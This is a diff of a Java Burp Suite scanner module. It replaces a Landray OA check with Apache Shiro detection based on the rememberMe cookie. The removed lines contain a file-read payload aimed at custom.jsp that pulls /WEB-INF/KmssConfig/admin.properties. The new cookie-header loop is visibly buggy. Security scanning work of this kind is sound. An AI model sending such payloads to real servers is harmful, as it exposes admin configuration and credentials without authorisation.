@@ -3,17 +3,17 @@ package burp.vuls;
 import burp.BurpExtender;
 import burp.IBurpExtenderCallbacks;
 import burp.IExtensionHelpers;
-import burp.IHttpRequestResponse;
-import burp.impl.VulResult;
 import burp.impl.VulTaskImpl;
-import burp.task.BeanParamInject;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.Response;
 import org.jetbrains.annotations.NotNull;
 
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.List;
+import java.util.Locale;
+import java.util.Objects;
 
 public class ShiroUse extends VulTaskImpl {
 
@@ -29,13 +29,30 @@ public class ShiroUse extends VulTaskImpl {
      */
     @Override
     public void run() {
-        // TODO 待完成
-        if (method.equalsIgnoreCase("post")) {
-            //新的请求包
-            url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
-            String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
-            //新请求
-            okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new ShiroUseCallback(this));
+        /**
+         * 检测逻辑
+         * 1、确认使用shiro
+         *  添加cookie：rememberMe=1，检车是否返回cookie：rememberMe=deleteMe
+         * */
+        // 后缀检查，静态资源不做测试
+        List<String> add = new ArrayList<>();
+        add.add(".js");
+        if (!isStaticSource(path, add)){
+            List<String> new_headers1 = new ArrayList<>();
+            String cookie = "rememberMe=1";
+            boolean hasCookie = false;
+            //新请求修改origin
+            for (String header : request_header_list) {
+                if (!header.toLowerCase(Locale.ROOT).contains("Cookie".toLowerCase(Locale.ROOT))) {
+                    new_headers1.add(header + ";" + cookie);
+                    hasCookie = true;
+                }
+                new_headers1.add(header);
+            }
+            if (!hasCookie){
+                new_headers1.add("Cookie: " + cookie);
+            }
+            okHttpRequester.send(url, method, new_headers1, query, request_body_str, contentYtpe, new ShiroUseCallback(this));
         }
     }
 }
@@ -54,13 +71,12 @@ class ShiroUseCallback implements Callback {
 
     @Override
     public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
-        // TODO 待完成
         if (response.isSuccessful()){
-            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
             // 检查响应体是否有内容
-            if (vulTask.ok_respBody.length() > 0) {
-                vulTask.message = "LandrayOa Vul";
-                vulTask.log(call);
+            if (Objects.requireNonNull(response.header("Set-Cookie")).contains("=deleteMe")) {
+                vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
+                vulTask.message = "ShiroUse";
+                vulTask.log(call); // TODO 如果使用了则看下是否用了默认key
             }
         }
     }
